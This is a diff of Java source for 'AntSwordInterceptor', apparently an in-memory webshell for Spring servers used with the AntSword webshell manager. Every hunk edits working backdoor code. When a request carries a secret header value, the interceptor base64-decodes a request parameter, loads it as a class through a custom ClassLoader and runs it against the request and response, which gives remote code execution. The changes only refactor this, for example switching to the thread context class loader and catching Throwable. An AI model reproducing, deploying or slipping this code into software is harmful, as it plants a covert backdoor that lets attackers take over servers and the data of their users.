@@ -15,17 +15,11 @@ public class AntSwordInterceptor extends ClassLoader implements AsyncHandlerInte
     public static String headerName;
     public static String headerValue;
 
-    @SuppressWarnings("all")
-    public Class<?> g(byte[] b) {
-        return super.defineClass(b, 0, b.length);
+    public AntSwordInterceptor() {
     }
 
     public AntSwordInterceptor(ClassLoader c) {
         super(c);
-    }
-
-
-    public AntSwordInterceptor() {
     }
 
     @Override
@@ -33,15 +27,20 @@ public class AntSwordInterceptor extends ClassLoader implements AsyncHandlerInte
         if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
             try {
                 byte[] bytes = base64Decode(request.getParameter(pass));
-                Object instance = (new AntSwordInterceptor(this.getClass().getClassLoader())).g(bytes).newInstance();
+                Object instance = (new AntSwordInterceptor(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                 instance.equals(new Object[]{request, response});
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 e.printStackTrace();
             }
             return false;
         } else {
             return true;
         }
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> g(byte[] b) {
+        return super.defineClass(b, 0, b.length);
     }
 
     @Override
@@ -55,7 +54,7 @@ public class AntSwordInterceptor extends ClassLoader implements AsyncHandlerInte
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -63,12 +62,9 @@ public class AntSwordInterceptor extends ClassLoader implements AsyncHandlerInte
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
